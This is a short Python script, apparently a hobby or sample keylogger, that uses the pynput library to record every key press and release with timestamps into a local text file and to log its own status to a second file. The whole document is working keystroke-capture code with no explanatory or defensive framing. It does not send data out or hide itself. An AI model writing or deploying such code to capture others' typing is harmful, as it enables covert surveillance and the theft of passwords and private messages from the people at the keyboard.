from pynput import keyboard
import datetime
import os

# Files to save keypresses and logs
output_file = "thing.txt"
log_file = "console.log"

def ensure_file_exists(file_path):
    """Ensure the file exists, create it if it doesn't."""
    if not os.path.exists(file_path):
        try:
            with open(file_path, "w") as f:
                pass  # Create an empty file
            log_to_console(f"INFO: Created {file_path}")
        except Exception as e:
            log_to_console(f"ERROR: Failed to create {file_path}: {e}")

def log_to_file(message):
    """Log keypress messages to the output file."""
    try:
        ensure_file_exists(output_file)
        with open(output_file, "a") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {message}\n")
    except Exception as e:
        log_to_console(f"ERROR: Failed to log to {output_file}: {e}")

def log_to_console(message):
    """Log debug and error messages to the console log file."""
    try:
        ensure_file_exists(log_file)
        with open(log_file, "a") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {message}\n")
    except Exception as e:
        print(f"Failed to log to {log_file}: {e}")

def on_press(key):
    """Handle key press events."""
    try:
        try:
            log_to_file(f"Key {key.char} pressed")
        except AttributeError:
            log_to_file(f"Special key {key} pressed")
    except Exception as e:
        log_to_console(f"ERROR in on_press: {e}")

def on_release(key):
    """Handle key release events."""
    try:
        log_to_file(f"Key {key} released")
    except Exception as e:
        log_to_console(f"ERROR in on_release: {e}")

# Set up the listener
try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        log_to_console("INFO: Keylogger started")
        listener.join()
except KeyboardInterrupt:
    log_to_console("INFO: Keylogger interrupted by user")
except Exception as e:
    log_to_console(f"ERROR: {e}")
finally:
    log_to_console("INFO: Keylogger stopped")